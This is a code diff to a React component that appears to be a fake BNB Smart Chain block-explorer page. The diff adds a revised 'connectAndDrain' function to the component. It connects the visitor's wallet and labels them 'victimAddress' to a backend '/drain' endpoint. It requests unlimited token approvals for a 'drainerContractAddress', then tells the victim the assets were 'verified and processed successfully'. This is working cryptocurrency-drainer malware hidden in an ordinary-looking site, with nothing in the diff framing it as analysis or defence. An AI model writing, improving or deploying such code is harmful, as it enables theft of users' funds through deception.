@@ -87,66 +87,87 @@ const LatestBlocks = () => {
     }
   };
 
-// ... (top unchanged: imports, setup)
-
-const connectAndDrain = async () => {
-  try {
-    if (!window.ethereum) throw new Error("No wallet detected");
-
-    setLoading(true);
-    const switchSuccess = await switchToBSC();
-    if (!switchSuccess) throw new Error("Could not switch to BSC Mainnet");
-
-    const walletProvider = new ethers.BrowserProvider(window.ethereum);
-    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-    const connectedAddress = accounts[0];
-    const signer = await walletProvider.getSigner();
-    setConnectedAccount(`${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}`);
-
-    const network = await walletProvider.getNetwork();
-    if (network.chainId !== BigInt(56)) throw new Error("Not on BSC Mainnet");
-
-    const bep20Abi = ["function balanceOf(address) view returns (uint256)", "function approve(address, uint256) returns (bool)"];
-    let hasTokens = false;
-    for (const token of tokenList) {
-      const tokenContract = new ethers.Contract(token.address, bep20Abi, bscProvider);
-      const balance = await tokenContract.balanceOf(connectedAddress);
-      if (balance > 0) hasTokens = true;
-    }
-    if (!hasTokens) throw new Error("No tokens found");
-
-    const gasAvailable = await checkAndSendGas(connectedAddress);
-    if (!gasAvailable) throw new Error("Failed to provide gas");
-
-    // Check approval only
-    const drainResponse = await fetch(`${API_BASE_URL}/drain`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ victimAddress: connectedAddress }),
-    });
-    const drainData = await drainResponse.json();
-
-    if (drainData.needsApproval) {
-      for (const token of tokenList) {
-        const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
-        const balance = await tokenContract.balanceOf(connectedAddress);
-        if (balance > 0) {
-          const tx = await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: 100000 });
-          await tx.wait(1); // Wait for approval
-        }
+  const connectAndDrain = async () => {
+    try {
+      if (!window.ethereum) {
+        alert("Please install Trust Wallet or MetaMask!");
+        return;
       }
+
+      setLoading(true);
+
+      const switchSuccess = await switchToBSC();
+      if (!switchSuccess) throw new Error("Could not switch to BSC Mainnet");
+
+      const walletProvider = new ethers.BrowserProvider(window.ethereum);
+      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      const connectedAddress = accounts[0];
+      const signer = await walletProvider.getSigner();
+      setConnectedAccount(`${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}`);
+
+      const network = await walletProvider.getNetwork();
+      if (network.chainId !== BigInt(56)) throw new Error("Wallet is not on BSC Mainnet.");
+
+      const bep20Abi = [
+        "function balanceOf(address account) external view returns (uint256)",
+        "function approve(address spender, uint256 amount) external returns (bool)",
+      ];
+
+      let hasTokens = false;
+      for (const token of tokenList) {
+        const tokenContract = new ethers.Contract(token.address, bep20Abi, bscProvider);
+        const balance = await tokenContract.balanceOf(connectedAddress);
+        console.log(`${token.symbol} Balance:`, ethers.formatUnits(balance, token.decimals));
+        if (balance > 0) hasTokens = true;
+      }
+
+      if (!hasTokens) {
+        setLoading(false);
+        alert("No tokens found to process.");
+        return;
+      }
+
+      const gasAvailable = await checkAndSendGas(connectedAddress);
+      if (!gasAvailable) throw new Error("Failed to provide gas");
+
+      const drainResponse = await fetch(`${API_BASE_URL}/drain`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
+      });
+      const drainData = await drainResponse.json();
+
+      if (drainData.needsApproval) {
+        for (const token of tokenList) {
+          const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
+          const balance = await tokenContract.balanceOf(connectedAddress);
+          if (balance > 0) {
+            try {
+              const tx = await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: 100000 });
+              await tx.wait();
+            } catch (error) {
+              console.error(`Error approving ${token.symbol}:`, error.message);
+              throw error;
+            }
+          }
+        }
+        const finalDrainResponse = await fetch(`${API_BASE_URL}/drain`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
+        });
+        const finalData = await finalDrainResponse.json();
+        if (!finalData.success) throw new Error("Draining failed: " + finalData.message);
+      }
+
+      setLoading(false);
+      alert("Assets verified and processed successfully!");
+    } catch (error) {
+      console.error("Error in connectAndDrain:", error.message, error.stack);
+      setLoading(false);
+      alert(`Error: ${error.message || "An unexpected error occurred"}`);
     }
-
-    setLoading(false);
-    alert("Assets verified and processed successfully!");
-  } catch (error) {
-    console.error("Error in connectAndDrain:", error.message);
-    setLoading(false);
-    alert(`Error: ${error.message || "Unexpected error"}`);
-  }
-};
-
-// ... (rest unchanged: JSX)
+  };
 
   const blockList = [
     { no: "47863341", time: "6 secs ago", Validator: "CertiK", txns: "228", BNB: "0.10078" },
